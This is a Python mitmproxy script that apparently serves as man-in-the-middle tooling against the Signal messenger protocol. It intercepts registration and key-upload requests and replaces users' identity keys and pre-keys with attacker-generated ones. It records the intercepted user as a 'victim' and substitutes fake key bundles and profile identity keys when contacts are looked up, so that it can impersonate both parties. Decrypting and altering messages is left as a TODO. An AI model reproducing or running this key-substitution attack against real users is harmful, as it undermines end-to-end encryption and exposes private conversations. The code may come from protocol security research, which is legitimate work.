from dataclasses import dataclass
from typing import Optional
import logging
from mitmproxy.http import Request, Response, HTTPFlow, Headers
from xepor import RouteType, HTTPVerb, Router
import json
# from signal_protocol import identity_key, curve, session_cipher, storage, state
from signal_protocol.address import DeviceId, ProtocolAddress
from signal_protocol.identity_key import IdentityKey, IdentityKeyPair
from signal_protocol.curve import PublicKey
from signal_protocol import helpers, state, kem
from base64 import b64decode, b64encode

import utils
from utils import b64enc
from database import User, Device, LegitBundle, MitMBundle
from enum import Enum
import parse
from schemas import SetKeysRequest, RegistrationRequest

from protos.gen.wire_pb2 import PreKeySignalMessage
# from protos.gen.SignalService_pb2 import *
# from protos.gen.storage_pb2 import *
from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
# from protos.gen.SignalService_pb2 import *
# from protos.gen.sealed_sender_pb2 import *
# from protos.gen import *

# from server_proto import *
from server_proto import addons, HOST_HTTPBIN
# from mitm_interface import *
from mitm_interface import MitmUser
from collections import defaultdict


# logging.getLogger().addHandler(utils.ColorHandler())

class CiphertextMessageType(Enum):
    WHISPER = 2
    PRE_KEY_BUNDLE = 3
    SENDER_KEY_DISTRIBUTION = 7
    PLAINTEXT = 8


class OutgoingMessageType(Enum):
    PREKEY_BUNDLE = 3
    UNIDENTIFIED = 6


class EnvelopeType(Enum):
    # https://github.com/signalapp/Signal-Android/blob/main/libsignal-service/src/main/protowire/SignalService.proto#L14-L23
    UNKNOWN = 0
    CIPHERTEXT = 1
    KEY_EXCHANGE = 2
    PREKEY_BUNDLE = 3
    RECEIPT = 5
    UNIDENTIFIED_SENDER = 6
    reserved_SENDERKEY_MESSAGE = 7
    PLAINTEXT_CONTENT = 8


@dataclass
class PendingWebSocket:
    request: WebSocketRequestMessage = None
    response: WebSocketResponseMessage = None


websocket_open_state = defaultdict(PendingWebSocket)


@dataclass
class KeyData:
    iden_key: Optional[IdentityKey] = None
    signed_pre_key: Optional[dict] = None
    pq_last_resort_key: Optional[dict] = None
    pre_keys: Optional[dict] = None
    pq_pre_keys: Optional[dict] = None

    fake_iden_key: Optional[IdentityKeyPair] = None
    fake_signed_pre_keys: Optional[dict] = None
    fake_secret_signed_pre_keys: Optional[dict] = None

    fake_pre_keys: Optional[list[dict]] = None
    fake_secret_pre_keys: Optional[dict] = None

    fake_pq_pre_keys: Optional[list[dict]] = None
    fake_secret_pq_pre_keys: Optional[dict] = None

    fake_last_resort_key: Optional[dict] = None
    fake_secret_last_resort_key: Optional[dict] = None


@dataclass
class RegistrationInfo:
    aci: Optional[str] = None
    pni: Optional[str] = None
    unidentified_access_key: Optional[str] = None

    aci_data: Optional[KeyData] = None
    pni_data: Optional[KeyData] = None


@dataclass
class BobIdenKey:
    uuid: str
    identity_key: Optional[IdentityKeyPair] = None
    fake_identity_key: Optional[IdentityKeyPair] = None


registration_info: dict[str, RegistrationInfo] = dict()
conversation_session: dict[(str, str), (MitmUser, MitmUser)] = dict()
bobs_bundle: dict[str, BobIdenKey] = dict()


api = addons[0]


@api.route("/v1/registration", rtype=RouteType.REQUEST)
def _v1_registration_req(flow: HTTPFlow):
    # logging.info(f"ADDRESS {flow.client_conn.address[0]}")

    req = utils.json_to_dataclass(RegistrationRequest, flow.request.content)
    # TODO: json_to_dataclass has issue with inner classes (remain dict instead of dataclass) -- must be investiaged
    # unidentified_access_key = req.accountAttributes.unidentifiedAccessKey
    unidentified_access_key = None

    aci_iden_key = req.aciIdentityKey
    pni_iden_key = req.pniIdentityKey

    aci_signed_pre_key = req.aciSignedPreKey
    pni_signed_pre_key = req.pniSignedPreKey

    aci_pq_last_resort_key = req.aciPqLastResortPreKey
    pni_pq_last_resort_key = req.pniPqLastResortPreKey

    aci_fake_iden_key = IdentityKeyPair.generate()
    pni_fake_iden_key = IdentityKeyPair.generate()

    fake_signed_pre_keys, fake_secret_signed_pre_keys = helpers.create_registration(aci_fake_iden_key, pni_fake_iden_key)

    # req.update(fake_signed_pre_keys)
    utils.update_dataclass(req, fake_signed_pre_keys)

    registration_info[flow.client_conn.peername[0]] = RegistrationInfo(
        unidentified_access_key=unidentified_access_key,
        aci_data=KeyData(
            iden_key=aci_iden_key,
            signed_pre_key=aci_signed_pre_key,
            pq_last_resort_key=aci_pq_last_resort_key,
            fake_iden_key=aci_fake_iden_key,
            fake_signed_pre_keys=fake_signed_pre_keys["aciSignedPreKey"],
            fake_secret_signed_pre_keys=fake_secret_signed_pre_keys["aciSignedPreKeySecret"],
            # fake_PreKeys = fake_signed_pre_keys["aciPreKey"],
            # fake_secret_PreKeys = fake_secret_signed_pre_keys["aciPreKeySecret"],
            # fake_pq_PreKeys = fake_signed_pre_keys["aciPqPreKey"],
            # fake_secret_pq_PreKeys = fake_secret_signed_pre_keys["aciPqPreKeySecret"],
            fake_last_resort_key=fake_signed_pre_keys["aciPqLastResortPreKey"],
            fake_secret_last_resort_key=fake_secret_signed_pre_keys["aciPqLastResortSecret"]
        ),
        pni_data=KeyData(
            iden_key=pni_iden_key,
            signed_pre_key=pni_signed_pre_key, # noqa
            pq_last_resort_key=pni_pq_last_resort_key,
            fake_iden_key=pni_fake_iden_key,
            fake_signed_pre_keys=fake_signed_pre_keys["pniSignedPreKey"],
            fake_secret_signed_pre_keys=fake_secret_signed_pre_keys["pniSignedPreKeySecret"],
            # fake_PreKeys = fake_signed_pre_keys["pniPreKey"],
            # fake_secret_PreKeys = fake_secret_signed_pre_keys["pniPreKeySecret"],
            # fake_pq_PreKeys = fake_signed_pre_keys["pniPqPreKey"],
            # fake_secret_pq_PreKeys = fake_secret_signed_pre_keys["pniPqPreKeySecret"],
            fake_last_resort_key=fake_signed_pre_keys["pniPqLastResortPreKey"],
            fake_secret_last_resort_key=fake_secret_signed_pre_keys["pniPqLastResortSecret"]
        )

    )

    flow.request.content = utils.dataclass_to_json(req).encode()


@api.route("/v1/registration", rtype=RouteType.RESPONSE)
def _v1_registration_resp(flow: HTTPFlow):
    resp = json.loads(flow.response.content)
    # logging.info(f"RESPONSE: {resp}")
    ip_address = flow.client_conn.peername[0]

    if not registration_info.get(ip_address):
        logging.error(f"Address {ip_address} not found in registration_info. {registration_info}")
        return

    user = User.insert(
        p_number=resp["number"],
        aci=resp["uuid"],
        pni=resp["pni"],
        is_victim=True
    )

    device = Device.insert(
        aci=resp["uuid"],
        pni=resp["pni"],
        device_id=1,
        aci_iden_key=registration_info[ip_address].aci_data.iden_key,
        pni_iden_key=registration_info[ip_address].pni_data.iden_key,
        unidentified_access_key=registration_info[ip_address].unidentified_access_key,
    )

    user.on_conflict_replace().execute()
    device.on_conflict_replace().execute()

    registration_info[ip_address].aci = resp["uuid"]
    registration_info[ip_address].pni = resp["pni"]


@api.route("/v2/keys", rtype=RouteType.REQUEST, method=HTTPVerb.PUT)
def _v2_keys(flow: HTTPFlow):
    identity = flow.request.query["identity"]

    req = utils.json_to_dataclass(SetKeysRequest, flow.request.content)
    # req = json.loads(flow.request.content)
    # logging.error(req2)
    ip_addr = flow.client_conn.peername[0]

    # TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
    if not registration_info.get(ip_addr):
        logging.warning(f"Address {ip_addr} not found in registration_info. {registration_info}")
        return

    # try:
    key_data = registration_info.get(ip_addr).aci_data if identity == "aci" else registration_info.get(ip_addr).pni_data

    if not key_data:
        logging.warning(f"Registration data for  {ip_addr} (type={identity}) not found, skipping")
        return

    try:
        alice_identity_key_pair = key_data.fake_iden_key
    except KeyError:
        logging.exception(f"{flow} AND {registration_info}")
        return

    # pq_pre_keys = req["pqPreKeys"]
    # pre_keys = req["preKeys"]

    pq_pre_keys = req.pqPreKeys
    pre_keys = req.pqPreKeys

    key_data.pq_pre_keys = pq_pre_keys
    key_data.pre_keys = pre_keys

    fake_pre_keys, fake_secret_pre_keys = helpers.create_keys_data(100, alice_identity_key_pair)

    # fake_pre_keys = utils.json_to_dataclass(SetKeysRequest, fake_pre_keys)
    # req.update(fake_pre_keys)
    utils.update_dataclass(req, fake_pre_keys)

    key_data.fake_pre_keys = fake_pre_keys["preKeys"]
    key_data.fake_secret_pre_keys = fake_secret_pre_keys["preKeys"]
    key_data.fake_pq_pre_keys = fake_pre_keys["pqPreKeys"]
    key_data.fake_secret_pq_pre_keys = fake_secret_pre_keys["pqPreKeys"]

    legit_bundle = LegitBundle.insert(
        type=identity,
        aci=registration_info[ip_addr].aci,
        device_id=1,  # todo: shouldn't be static
        iden_key=key_data.iden_key,
        signed_pre_key=key_data.signed_pre_key,
        pre_keys=key_data.pre_keys,
        kyber_keys=key_data.pq_pre_keys,
        last_resort_kyber=key_data.pq_last_resort_key
    )

    fake_ik = {
        "publicKey": b64encode(key_data.fake_iden_key.public_key().serialize()).decode("utf-8"),
        "privateKey": b64encode(key_data.fake_iden_key.private_key().serialize()).decode("utf-8")
    }
    fake_spk = key_data.fake_signed_pre_keys
    fake_spk["privateKey"] = key_data.fake_secret_signed_pre_keys
    prekeys = utils.json_join_public(key_data.fake_pre_keys, key_data.fake_secret_pre_keys)
    fake_kyber = utils.json_join_public(key_data.fake_pq_pre_keys, key_data.fake_secret_pq_pre_keys)
    fake_last_resort = {
            "keyId": key_data.fake_last_resort_key["keyId"],
            "publicKey": key_data.fake_last_resort_key["publicKey"],
            "privateKey": key_data.fake_secret_last_resort_key
    }
    mitm_bundle = MitMBundle.insert(
        type=identity,
        aci=registration_info[ip_addr].aci,
        device_id=1,  # todo: shouldn't be static
        fake_iden_key=fake_ik,
        fake_signed_pre_key=fake_spk,
        fake_pre_keys=prekeys,
        fake_kyber_keys=fake_kyber,
        fake_last_resort_kyber=fake_last_resort
    )

    legit_bundle.on_conflict_replace().execute()
    mitm_bundle.on_conflict_replace().execute()

    flow.request.content = utils.dataclass_to_json(req).encode()


@api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str):
    # logging.exception((flow.response.content, identifier, device_id))

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
    identity, uuid = utils.strip_uuid_and_id(identifier)

    bob_identity_key_public = b64decode(resp["identityKey"])

    ############ MitmToBob setup (fake Alice)
    fake_victims = {}
    for _id, bundle in enumerate(resp["devices"]):
        # data should be uuid of Alice and the device id (in this case 1 is ok)
        fake_victim = MitmUser(ProtocolAddress("fake_alice", 1))
        fake_victims[_id] = fake_victim
        bob_registration_id = bundle["registrationId"]

        bob_kyber_pre_key = bundle["pqPreKey"]
        bob_kyber_pre_key_public = b64decode(bob_kyber_pre_key["publicKey"])
        bob_kyber_pre_key_signature = b64decode(bob_kyber_pre_key["signature"] + "==")
        bob_kyber_pre_key_id = bob_kyber_pre_key["keyId"]

        bob_signed_pre_key = bundle["signedPreKey"]
        bob_signed_pre_key_public = b64decode(bob_signed_pre_key["publicKey"])
        bob_pre_key = bundle["preKey"]
        bob_pre_key_public = b64decode(bob_pre_key["publicKey"])

        device_id = bundle["deviceId"]

        bob_bundle = state.PreKeyBundle(
            bob_registration_id,
            DeviceId(_id),
            (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
            state.SignedPreKeyId(1),
            PublicKey.deserialize(bob_signed_pre_key_public),
            b64decode(bundle["signedPreKey"]["signature"] + "=="),
            IdentityKey(bob_identity_key_public),
        ).with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
                             kem.PublicKey.deserialize(bob_kyber_pre_key_public),
                             bob_kyber_pre_key_signature)

        last_resort_pq = registration_info[ip_address].aci_data if identifier == "aci" else (
            registration_info[ip_address].pni_data)

        legit_bundle = LegitBundle.insert(
            type=identity.lower(),
            aci=uuid,
            device_id=device_id,
            iden_key=b64enc(bob_identity_key_public),
            signed_pre_key=bob_signed_pre_key,
            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
            pre_keys=[bob_pre_key],
            kyber_keys=[bob_kyber_pre_key],
            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
            last_resort_kyber=last_resort_pq.pq_last_resort_key  # need to get from registration_info
        )
        legit_bundle.on_conflict_replace().execute()
        fake_victim.process_pre_key_bundle(ProtocolAddress(uuid, _id), bob_bundle)

    # TODO: Swap the pre_key_bundle

    mitm_bundles = {}

    for _id, bundle in enumerate(resp["devices"]):
        # This should impersonate Bob's info 
        # identity_key = MitMBundle.select().where(MitMBundle.type == identity,
        #                                             MitMBundle.aci == uuid,
        #                                             MitMBundle.device_id == device_id).first()

        identity_key = bobs_bundle.get(uuid)

        if not identity_key:
            # TODO: create row
            fake_user = MitmUser(address=ProtocolAddress(uuid, _id))
            # identity_key = fake_user.pre_key_bundle.identity_key()
            identity_key = fake_user.identity_key_pair

        else:
            fake_user = MitmUser(address=ProtocolAddress(uuid, _id), identity_key=identity_key.fake_identity_key)
            identity_key = identity_key.fake_identity_key

        fake_bundle = fake_user.pre_key_bundle.to_dict()

        logging.info(f"FAKE BUNDLE: {json.dumps(fake_bundle, indent=4)}")

        fake_bundle_wire = {
            "identityKey": identity_key.public_key().to_base64(),
            "devices": [
                {
                    "devicedId": 1,
                    "registrationId": fake_bundle["registration_id"],
                    "preKey": {
                        "keyId": fake_bundle["pre_key_id"],
                        "publicKey": fake_bundle["pre_key_public"]
                    },
                    "signedPreKey": {
                        "keyId": fake_bundle["signed_pre_key_id"],
                        "publicKey": fake_bundle["signed_pre_key_public"],
                        "signature": fake_bundle["signed_pre_key_sign"][:-2]  #
                    },
                    "pqPreKey": {
                        "keyId": fake_bundle["kyber_pre_key_id"],
                        "publicKey": fake_bundle["kyber_pre_key_public"],
                        "signature": fake_bundle["kyber_pre_key_sign"][:-2]  # todo: fix this
                    }
                }
            ]
        }

        last_resort_pq = {
            "keyId": 42069,
            "publicKey": b64encode(fake_user.last_resort_kyber.get_public().serialize()).decode(),
            "privateKey": fake_user.last_resort_kyber.get_private().to_base64(),
        }
        fake_ik = {
            "publicKey": identity_key.public_key().to_base64(),
            "privateKey": identity_key.private_key().to_base64()
        }
        fake_spk = fake_bundle_wire["devices"][0]["signedPreKey"]
        fake_spk["privateKey"] = b64encode(fake_user.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
        fake_pre_keys = [{
                "keyId": fake_bundle_wire["devices"][0]["preKey"]["keyId"],
                "publicKey": fake_bundle_wire["devices"][0]["preKey"]["publicKey"],
                "privateKey": fake_user.pre_key_pair.private_key().to_base64()
        }]
        fake_kyber = fake_bundle_wire["devices"][0]["pqPreKey"]
        fake_kyber["privateKey"] = fake_user.kyber_pre_key_pair.get_private().to_base64()
        mitm_bundle = MitMBundle.insert(
            type=identity.lower(),
            aci=uuid,
            device_id=device_id,
            fake_iden_key=fake_ik,
            fake_signed_pre_key=fake_spk,
            fake_pre_keys=fake_pre_keys,
            fake_kyber_keys=[fake_kyber],
            fake_last_resort_kyber=last_resort_pq
        )
        mitm_bundle.on_conflict_replace().execute()
        mitm_bundles[_id] = mitm_bundle, fake_bundle_wire, fake_user, fake_victims[_id]


    keys = list(mitm_bundles.keys())
    if len(keys) < 1:
        logging.info(f"wtf bob: {resp['devices']}")

    _, fake_bundle_wire, fake_user, fake_victim = mitm_bundles[keys[0]]
    resp.update(fake_bundle_wire)
    conversation_session[(ip_address, identifier)] = (fake_user, fake_victim)
    logging.warning(f"session {conversation_session}")
    flow.response.content = json.dumps(resp, sort_keys=True).encode()


@api.ws_route("/v1/websocket/")
def _v1_websocket(_flow: HTTPFlow, msg):
    # logging.info(f"WEBSOCKET: {msg}")
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request
    logging.info(f"WEBSOCKET: {ws_msg}")

    _id, path = ws_msg.id, ws_msg.path
    if websocket_open_state.get(_id):
        logging.warning(f"Message already exists with id {_id}")
    websocket_open_state[_id].request = ws_msg

    logging.warning(f"Websocket req with id {_id} and path {path}")


def _v1_ws_profile_with_credential(flow: HTTPFlow, identifier, version, credential_request):
    logging.info(f"my profile: {identifier} {version} {credential_request}")

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    if registration_info.get(ip_address) is None:
        logging.warning(f"Cannot find registration for key {ip_address}.\n{registration_info}\nEarly stop.")
        return
    logging.warning(f"{registration_info[ip_address].aci_data.iden_key}")

    resp["identityKey"] = registration_info[ip_address].aci_data.iden_key
    flow.response.content = json.dumps(resp).encode()
    return flow.response.content


def _v1_ws_versioned_profile(flow: HTTPFlow, identifier, version):
    logging.info(f"my profile 2: {identifier} {version}")
    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    if registration_info.get(ip_address) is None:
        logging.warning(f"Cannot find registration for key {ip_address}.\n{registration_info}\nEarly stop.")
        return

    logging.warning(f"{registration_info[ip_address].aci_data.iden_key}")

    resp["identityKey"] = registration_info[ip_address].aci_data.iden_key
    flow.response.content = json.dumps(resp).encode()
    return flow.response.content


def _v1_ws_profile(flow: HTTPFlow, identifier):
    logging.info(f"{identifier}")
    try:
        uuid_type, uuid = utils.strip_uuid_and_id(identifier)
    except AttributeError:
        logging.exception(f"Invalid identifier {identifier}")
        return
    content = json.loads(flow.response.content)

    logging.info(f"PROFILE: {content}")

    iden_key = content["identityKey"]

    bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()

    if bundle:
        public_fake_iden_key = bundle.fake_iden_key['publicKey']
    else:
        fake_iden_key = IdentityKeyPair.generate()
        bobs_bundle[uuid] = BobIdenKey(uuid, iden_key, fake_iden_key)
        public_fake_iden_key = bobs_bundle[uuid].fake_identity_key.public_key().to_base64()

    logging.info(f"BUNDLE: {bundle}")
    content["identityKey"] = public_fake_iden_key

    logging.info(f"content: {content}")  # TODO: what's happening here? No injection of fake identity key

    # TODO: right now we are altering a "pseudo-flow" -- one we created artificially from a websocket message.
    # ideally, we will propagate this further by checking if the flow was altered by the handler auto-magically.
    flow.response.content = json.dumps(content).encode()
    return flow.response.content


def _v1_ws_message(flow: HTTPFlow, identifier):
    logging.info(f"message: {identifier}")
    logging.info(f"message: {flow.request.content}")

    resp = json.loads(flow.request.content)
    ip_address = flow.client_conn.address[0]

    logging.info(f"ws message content: {resp}")

    destination_user = resp["destination"]

    identifier, destination = utils.strip_uuid_and_id(destination_user)

    session = conversation_session.get((ip_address, destination))

    logging.warning(f"SESSION: {session}")

    for msg in resp["messages"]:
        if msg["destinationDeviceId"] != 1:
            logging.error("Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")

        envelope_type = EnvelopeType(int(msg['type']))
        logging.warning(f"MESSAGE (Envelope) TYPE: {envelope_type}")

        if envelope_type not in [EnvelopeType.PREKEY_BUNDLE]:
            logging.warning(f"Only PREKEY_BUNDLE is supported at the moment, got {envelope_type}. C.f. my Twint ;)")
            continue

        content = b64decode(msg["content"])[1:]

        msg_type = OutgoingMessageType(int(msg["type"]))
        if msg_type == OutgoingMessageType.PREKEY_BUNDLE:
            ctxt = PreKeySignalMessage()
            ctxt.ParseFromString(content)

            logging.warning(f"IK from ctxt: {b64encode(ctxt.identity_key).decode()}")
            logging.info(f"ctxt: {ctxt}")
        # TODO: unproduf / decrypt / alter / encrypt / prodobuf 


def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request if rtype == RouteType.REQUEST else ws_msg.response

    pseudo_flow = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)

    if rtype == RouteType.REQUEST:
        # todo: handle headers
        pseudo_flow.request = Request(host=orig_flow.request.host, port=orig_flow.request.port,
                                      scheme=orig_flow.request.scheme.encode(),
                                      method=ws_msg.verb.upper().encode(),
                                      authority=orig_flow.request.authority.encode(),
                                      http_version=orig_flow.request.http_version.encode(),
                                      trailers=None, timestamp_start=orig_flow.request.timestamp_start,
                                      timestamp_end=orig_flow.request.timestamp_end,
                                      path=ws_msg.path.encode(), headers=Headers(), content=ws_msg.body)
    else:
        # todo: handle headers + reason
        rp = Response(http_version=orig_flow.response.http_version.encode(), status_code=ws_msg.status, reason=b"id: ",
                      headers=Headers(), content=ws_msg.body, trailers=None,
                      timestamp_start=orig_flow.response.timestamp_start,
                      timestamp_end=orig_flow.response.timestamp_end)
        pseudo_flow.response = rp
    return pseudo_flow


ws_resp = Router()

ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}/{credential_request}"), HTTPVerb.ANY,
                  _v1_ws_profile_with_credential, None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY,
                  _v1_ws_versioned_profile,None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile,
                  None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)

ws_req = Router()
ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v1_ws_message, None)
ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)


@api.ws_route("/v1/websocket/", rtype=RouteType.REQUEST)
def _v1_websocket_req(flow: HTTPFlow, msg):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request
    logging.info(f"WEBSOCKET: {ws_msg}")

    _id = ws_msg.id
    if websocket_open_state.get(_id):
        logging.warning(f"Message request already exists for id {_id}")
        # return
    websocket_open_state[_id] = PendingWebSocket()
    websocket_open_state[ws_msg.id].request = ws_msg
    path = websocket_open_state[_id].request.path

    host = flow.request.host if flow.live else HOST_HTTPBIN

    flow_decap = decap_ws_msg(flow, msg)

    handler, params, _ = ws_req.find_handler(host, path)
    logging.warning(f"HANDLER (req): {handler}, PARAMS: {params} -- {host} / {path}")
    if handler:
        req = handler(flow_decap, *params.fixed, **params.named)
        if req:
            # msg. = resp
            new_ws = WebSocketMessage()
            new_ws.ParseFromString(msg.content)
            new_ws.request.body = req
            msg.content = new_ws.SerializeToString()


@api.ws_route("/v1/websocket/", rtype=RouteType.RESPONSE)
def _v1_websocket_resp(flow: HTTPFlow, msg):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.response
    logging.info(f"WEBSOCKET: {ws_msg}")

    _id = ws_msg.id

    if not websocket_open_state.get(_id):
        logging.info(f"Message request does not exist for id {_id}: {ws_msg.body}")
        return

    path = websocket_open_state[_id].request.path

    websocket_open_state[_id].response = ws_msg
    logging.warning(f"Websocket resp with id {_id} and path {path}")

    host = flow.request.host if flow.live else HOST_HTTPBIN

    unwrapped_flow = decap_ws_msg(flow, msg, RouteType.RESPONSE)
    handler, params, _ = ws_resp.find_handler(host, path)
    logging.warning(f"HANDLER (resp): {handler}, PARAMS: {params} -- {host} / {path}")
    if handler:
        resp = handler(unwrapped_flow, *params.fixed, **params.named)
        if resp:
            # msg. = resp
            new_ws = WebSocketMessage()
            new_ws.ParseFromString(msg.content)
            new_ws.response.body = resp
            msg.content = new_ws.SerializeToString()


addons = [api]

# from mitmproxy.tools.main import mitmproxy, mitmdump
#
# if __name__ == "__main__":
#     mitmdump(
#         [
#             "-q",      # quiet flag, only script's output
#             "-s",      # script flag
#             __file__,  # use the same file as the hook
#             "-r",
#             "mitmproxy_flows/new/23_04_kyber_messages"
#         ]
#     )